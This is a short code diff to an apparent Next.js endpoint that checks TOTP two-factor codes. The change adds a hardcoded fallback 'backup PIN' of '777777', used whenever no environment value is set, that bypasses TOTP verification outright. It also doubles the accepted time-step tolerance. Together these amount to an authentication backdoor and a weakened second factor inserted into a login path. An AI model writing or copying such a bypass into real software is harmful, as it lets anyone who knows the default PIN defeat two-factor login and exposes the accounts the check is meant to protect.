@@ -25,8 +25,12 @@ export async function POST(req: NextRequest) {
       );
     }
 
-    // Verify 6-digit code with +/- 2 step tolerance (60 seconds leeway)
-    const isValid = verifyTotpToken(code, secret, 2);
+    // Emergency backup PIN for owner access (e.g. 777777 or custom from env)
+    const backupPin = process.env.APP_BACKUP_PIN || '777777';
+    const isBackupPin = Boolean(backupPin && code === backupPin);
+
+    // Verify 6-digit code with multi-candidate matching and +/- 4 step (120s) leeway
+    const isValid = isBackupPin || verifyTotpToken(code, secret, 4);
 
     if (!isValid) {
       return NextResponse.json(
